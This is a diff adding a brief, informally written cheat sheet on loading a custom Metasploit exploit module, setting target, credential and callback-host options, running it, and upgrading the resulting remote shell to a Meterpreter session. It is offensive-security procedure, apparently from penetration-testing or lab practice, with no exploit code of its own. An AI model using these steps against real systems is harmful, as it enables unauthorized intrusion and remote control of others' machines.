@@ -1,0 +1,26 @@
+Metasploit custom modual
+
+cd /root/.msf4
+cd modules
+mkdir -p exploits/my_exploit/
+cd exploits/my_exploit/
+pico MyExploit.rb (put your exploit in this)
+use exploits/my_exploit/MyExploit
+
+set username YOUR_USERNAME
+set password YOUR_PASSWORD
+set RHOSTS IP_OF_REMOTE_HOST
+set LHOST IP_ADDRESS_OF_KALI
+
+run
+
+
+stablize shell
+backround 
+search shell_to_meterpreter
+use post/multi/manage/shell_to_meterpreter
+sessions -l
+show options
+set SESSION <id-of session>
+run
+session -i <New-meterpeter-session>
